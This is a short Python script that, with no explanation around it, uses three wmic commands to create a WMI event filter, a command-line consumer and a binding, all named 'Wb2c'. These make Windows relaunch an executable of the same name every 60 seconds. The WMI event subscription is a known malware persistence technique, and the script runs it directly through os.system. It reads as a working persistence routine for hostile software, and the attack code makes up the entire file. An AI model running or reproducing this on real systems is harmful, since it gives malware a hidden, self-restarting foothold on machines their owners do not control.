import os

user = os.getlogin()
path = __file__
path = os.getcwd()+"\\"+path.split(".")[0]+".exe"
print(path)

cmd = f'''
wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="Wb2c", EventNameSpace="root\\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="Wb2c", ExecutablePath="{path}",CommandLineTemplate="{path}"
wmic /NAMESPACE:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\"Wb2c\\"", Consumer="CommandLineEventConsumer.Name=\\"Wb2c\\""
'''

for i in cmd.split("\n"):
    os.system(i)
